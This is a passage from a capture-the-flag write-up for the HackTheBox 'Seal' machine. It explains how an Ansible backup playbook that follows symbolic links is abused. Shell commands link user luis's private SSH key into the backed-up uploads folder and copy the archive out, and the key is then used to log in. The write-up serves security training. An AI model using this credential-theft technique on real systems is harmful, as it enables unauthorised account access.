# user 2

## /etc/passwd

![](seal.htb-14.png)
- an account called luis is able to login, this must be the user account to target

## backup process

![](seal.htb-15.png)
- directory /opt/backups has 2 folders; <span class="myTurquoise">archives</span> and <span class="myTangerine">playbook</span>
- <span class="myTurquoise">archives</span> has backup files created every minute

````bash
cat run.yml
- hosts: localhost
  tasks:
  - name: Copy Files
    synchronize: src=/var/lib/tomcat9/webapps/ROOT/admin/dashboard dest=/opt/backups/files copy_links=yes
  - name: Server Backups
    archive:
      path: /opt/backups/files/
      dest: "/opt/backups/archives/backup-{{ansible_date_time.date}}-{{ansible_date_time.time}}.gz"
  - name: Clean
    file:
      state: absent
      path: /opt/backups/files/

````


- <span class="myTangerine">playbook</span> has a .yml file containing information about how the backups are executed. 
- Symbolic links are allowed and followed in the backups meaning that any symbolic links will cause those linked files to be copied directly.

````bash
cd /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads
ln -s /home/luis/.ssh/id_rsa luis_id_rsa
cd /opt
cd backups
cd archives
cp backup-2021-08-07-23:37:32.gz /dev/shm
````

![](seal.htb-17.png)
- The symbolic link to private key is created.
- private copied along with other backups

![](seal.htb-18.png)
- to make the .gz easier to work with, the file is encoded in base64 and copied over to Kali

![](seal.htb-19.gif)
- The file is transferred and extracted

![](seal.htb-20.gif)
- Once extracted, the key is used to login